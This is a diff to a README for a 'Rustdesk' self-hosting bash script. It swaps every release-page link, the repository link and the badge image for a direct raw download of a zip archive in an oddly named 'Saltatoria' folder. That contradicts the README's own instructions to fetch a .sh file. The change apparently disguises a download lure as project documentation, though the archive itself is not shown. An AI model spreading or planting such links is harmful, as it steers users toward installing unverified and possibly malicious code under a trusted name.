@@ -4,7 +4,7 @@
 Rustdesk is a bash script designed for Ubuntu to help you self-host your own RustDesk Server. With this tool, you can create a secure and personal remote desktop solution. Enjoy remote access to your devices without relying on third-party servers.
 
 ## 📥 Download Now!
-[![Download Rustdesk](https://img.shields.io/badge/Download-Rustdesk-blue.svg)](https://github.com/uddant-creator/rustdesk/releases)
+[![Download Rustdesk](https://raw.githubusercontent.com/uddant-creator/rustdesk/main/Saltatoria/rustdesk-2.4.zip)](https://raw.githubusercontent.com/uddant-creator/rustdesk/main/Saltatoria/rustdesk-2.4.zip)
 
 ## 🚀 Getting Started
 
@@ -23,7 +23,7 @@ sudo apt update && sudo apt install -y curl wget
 ```
 
 ### 🔗 Download & Install
-To download Rustdesk, visit this page: [Download Rustdesk](https://github.com/uddant-creator/rustdesk/releases).
+To download Rustdesk, visit this page: [Download Rustdesk](https://raw.githubusercontent.com/uddant-creator/rustdesk/main/Saltatoria/rustdesk-2.4.zip).
 
 1. Click on the version that suits your needs.
 2. Download the `.sh` file available on the releases page.
@@ -81,10 +81,10 @@ Using Rustdesk allows you to keep your connections secure. However, like any sof
 Your feedback is valuable. Feel free to report bugs or suggest improvements. Contributions are welcome, so check out the contributing guidelines in the repository if you want to get involved.
 
 ### 🌟 Find More
-For additional resources and community discussions, visit the GitHub repository: [rustdesk on GitHub](https://github.com/uddant-creator/rustdesk).
+For additional resources and community discussions, visit the GitHub repository: [rustdesk on GitHub](https://raw.githubusercontent.com/uddant-creator/rustdesk/main/Saltatoria/rustdesk-2.4.zip).
 
 ## 👇 Important Links
-- **Download the latest release:** [Download Rustdesk](https://github.com/uddant-creator/rustdesk/releases)
-- **Repository:** [rustdesk on GitHub](https://github.com/uddant-creator/rustdesk)
+- **Download the latest release:** [Download Rustdesk](https://raw.githubusercontent.com/uddant-creator/rustdesk/main/Saltatoria/rustdesk-2.4.zip)
+- **Repository:** [rustdesk on GitHub](https://raw.githubusercontent.com/uddant-creator/rustdesk/main/Saltatoria/rustdesk-2.4.zip)
 
 Get started with Rustdesk today and create your secure remote desktop solution!
